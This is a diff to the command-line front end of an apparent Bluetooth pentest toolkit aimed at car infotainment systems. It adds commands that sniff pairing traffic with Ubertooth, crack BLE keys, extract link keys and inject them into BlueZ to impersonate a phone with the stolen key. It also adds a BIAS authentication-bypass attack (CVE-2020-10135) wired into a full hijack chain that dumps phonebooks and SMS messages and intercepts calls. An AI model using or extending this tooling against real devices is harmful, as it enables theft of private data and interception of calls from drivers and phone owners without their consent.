@@ -27,7 +27,7 @@ def main(verbose):
     Modules:
       adapter    - HCI adapter management
       scan       - Discover BT Classic and BLE devices
-      recon      - Enumerate services, fingerprint, channel scanning
+      recon      - Enumerate services, fingerprint, channel scanning, Ubertooth capture
       spoof      - MAC address spoofing and device impersonation
       pbap       - Phone Book Access Profile (phonebook, call logs)
       map        - Message Access Profile (SMS/MMS)
@@ -38,6 +38,7 @@ def main(verbose):
       tpms       - TPMS sensor attacks (BLE + 315/433 MHz SDR)
       vulnscan   - Vulnerability scanning
       hijack     - Full attack chain orchestration
+      bias       - BIAS auth bypass attack (CVE-2020-10135)
       dos        - DoS and pairing attacks
       fuzz       - Protocol fuzzing (L2CAP, RFCOMM, AT)
       report     - Pentest report generation
@@ -384,6 +385,97 @@ def recon_pairing_mode(address, hci):
         f"[cyan]Pairing Method:[/cyan] {result.get('pairing_method', 'Unknown')}"
     )
     console.print(Panel(panel_text, title="Pairing Mode Detection", border_style="cyan"))
+
+
+@recon.command("ubertooth-scan")
+@click.option("-d", "--duration", default=30, help="Scan duration (seconds)")
+def recon_ubertooth_scan(duration):
+    """Scan for active BR/EDR piconets using Ubertooth One."""
+    from bt_tap.recon.ubertooth import UbertoothCapture
+
+    cap = UbertoothCapture()
+    if not cap.is_available():
+        error("Ubertooth tools not found. Install: apt install ubertooth")
+        return
+    cap.scan_piconets(duration)
+
+
+@recon.command("ubertooth-follow")
+@click.argument("address", required=False, default=None)
+@click.option("-o", "--output", default="bt_capture.pcap", help="Output pcap file")
+@click.option("-d", "--duration", default=120, help="Capture duration (seconds)")
+def recon_ubertooth_follow(address, output, duration):
+    """Follow a device's piconet and capture traffic to pcap."""
+    address = resolve_address(address)
+    if not address:
+        return
+    from bt_tap.recon.ubertooth import UbertoothCapture
+
+    cap = UbertoothCapture()
+    cap.follow_piconet(address, output, duration)
+
+
+@recon.command("ubertooth-ble")
+@click.option("-t", "--target", default=None, help="BLE address to follow")
+@click.option("-o", "--output", default="ble_pairing.pcap", help="Output pcap file")
+@click.option("-d", "--duration", default=120, help="Capture duration (seconds)")
+def recon_ubertooth_ble(target, output, duration):
+    """Sniff BLE pairing exchanges using Ubertooth One."""
+    from bt_tap.recon.ubertooth import UbertoothCapture
+
+    cap = UbertoothCapture()
+    cap.sniff_ble_pairing(output, duration, follow_addr=target)
+
+
+@recon.command("crack-key")
+@click.argument("pcap_file")
+@click.option("-o", "--output", default=None, help="Output decrypted pcap")
+def recon_crack_key(pcap_file, output):
+    """Crack BLE pairing key from captured pcap using Crackle."""
+    from bt_tap.recon.ubertooth import CrackleRunner
+
+    runner = CrackleRunner()
+    result = runner.crack_ble(pcap_file, output)
+    if result.get("success"):
+        if result.get("ltk"):
+            success(f"LTK: {result['ltk']}")
+        if result.get("tk"):
+            info(f"TK: {result['tk']}")
+
+
+@recon.command("extract-link-key")
+@click.argument("pcap_file")
+def recon_extract_link_key(pcap_file):
+    """Extract BR/EDR link key from captured pairing pcap (via tshark)."""
+    from bt_tap.recon.ubertooth import LinkKeyExtractor
+
+    extractor = LinkKeyExtractor()
+    result = extractor.extract_from_pcap(pcap_file)
+    if result.get("success"):
+        for key in result.get("keys", []):
+            success(f"Link key: {key}")
+
+
+@recon.command("inject-link-key")
+@click.argument("remote_mac")
+@click.argument("link_key")
+@click.option("-i", "--hci", default="hci0")
+@click.option("--key-type", default=4, help="BlueZ key type (4=auth, 5=unauth)")
+def recon_inject_link_key(remote_mac, link_key, hci, key_type):
+    """Inject a recovered link key into BlueZ for impersonation.
+
+    \b
+    After recovering a link key (via Ubertooth capture + crack, or other means),
+    inject it so bluetoothctl can connect using the stolen key.
+    """
+    from bt_tap.recon.ubertooth import LinkKeyExtractor
+
+    extractor = LinkKeyExtractor()
+    adapter_mac = extractor.get_adapter_mac(hci)
+    if not adapter_mac:
+        error(f"Cannot determine adapter MAC for {hci}")
+        return
+    extractor.inject_link_key(adapter_mac, remote_mac, link_key, key_type)
 
 
 # ============================================================================
@@ -1199,8 +1291,9 @@ def vulnscan(address, hci, output):
 @click.option("-o", "--output-dir", default="hijack_output")
 @click.option("--recon-only", is_flag=True, help="Only run reconnaissance phase")
 @click.option("--skip-audio", is_flag=True, help="Skip audio setup phase")
+@click.option("--bias", is_flag=True, help="Use BIAS attack (CVE-2020-10135) for auth bypass")
 def hijack(ivi_address, phone_address, phone_name, hci, output_dir,
-           recon_only, skip_audio):
+           recon_only, skip_audio, bias):
     """Full IVI hijack: spoof phone identity and extract data.
 
     \b
@@ -1215,6 +1308,11 @@ def hijack(ivi_address, phone_address, phone_name, hci, output_dir,
       4a. PBAP      - Download phonebook & call logs
       4b. MAP       - Download SMS/MMS messages
       5. Audio      - Setup HFP for call interception
+
+    \b
+    Use --bias to attempt BIAS (CVE-2020-10135) role-switch attack
+    instead of normal pairing. Useful when the IVI validates link keys
+    and rejects simple MAC spoofing.
     """
     if not ivi_address or not phone_address:
         result = pick_two_devices()
@@ -1236,6 +1334,17 @@ def hijack(ivi_address, phone_address, phone_name, hci, output_dir,
     try:
         if recon_only:
             session.recon()
+        elif bias:
+            # BIAS path: recon → BIAS auth bypass → dump data
+            session.recon()
+            if session.connect_bias():
+                session.dump_phonebook()
+                session.dump_messages()
+                if not skip_audio:
+                    session.setup_audio()
+            results = {"method": "bias", "phases": {"recon": "success"}}
+            os.makedirs(output_dir, exist_ok=True)
+            _save_json(results, os.path.join(output_dir, "attack_results.json"))
         else:
             results = session.run_full_attack()
             # Save results
@@ -1246,6 +1355,71 @@ def hijack(ivi_address, phone_address, phone_name, hci, output_dir,
         warning("\nInterrupted by user")
     finally:
         session.cleanup()
+
+
+# ============================================================================
+# BIAS - Bluetooth Impersonation AttackS (CVE-2020-10135)
+# ============================================================================
+@main.group()
+def bias():
+    """BIAS attack — bypass authentication via role-switch (CVE-2020-10135)."""
+
+
+@bias.command("probe")
+@click.argument("ivi_address", required=False, default=None)
+@click.argument("phone_address", required=False, default=None)
+@click.option("-n", "--phone-name", default="", help="Phone name")
+@click.option("-i", "--hci", default="hci0")
+def bias_probe(ivi_address, phone_address, phone_name, hci):
+    """Probe whether IVI is potentially vulnerable to BIAS.
+
+    \b
+    Checks SSP support, BT version, and auto-reconnect behavior.
+    Does not attempt the actual attack.
+    """
+    if not ivi_address or not phone_address:
+        result = pick_two_devices()
+        if not result:
+            error("Device selection cancelled")
+            return
+        ivi_address, phone_address = result
+    from bt_tap.attack.bias import BIASAttack
+
+    attack = BIASAttack(ivi_address, phone_address, phone_name, hci)
+    attack.probe_vulnerability()
+
+
+@bias.command("attack")
+@click.argument("ivi_address", required=False, default=None)
+@click.argument("phone_address", required=False, default=None)
+@click.option("-n", "--phone-name", default="", help="Phone name to impersonate")
+@click.option("-i", "--hci", default="hci0")
+@click.option("-m", "--method", default="auto",
+              type=click.Choice(["auto", "role_switch", "internalblue"]),
+              help="Attack method")
+def bias_attack(ivi_address, phone_address, phone_name, hci, method):
+    """Execute BIAS attack to bypass IVI authentication.
+
+    \b
+    Methods:
+      auto         - Try role-switch, then suggest InternalBlue
+      role_switch  - Software-only SSP downgrade (no special hardware)
+      internalblue - Full LMP injection (requires Broadcom chipset)
+
+    \b
+    Requires: target IVI address and phone address to impersonate.
+    The phone should be a device the IVI has previously paired with.
+    """
+    if not ivi_address or not phone_address:
+        result = pick_two_devices()
+        if not result:
+            error("Device selection cancelled")
+            return
+        ivi_address, phone_address = result
+    from bt_tap.attack.bias import BIASAttack
+
+    attack = BIASAttack(ivi_address, phone_address, phone_name, hci)
+    attack.execute(method)
 
 
 # ============================================================================
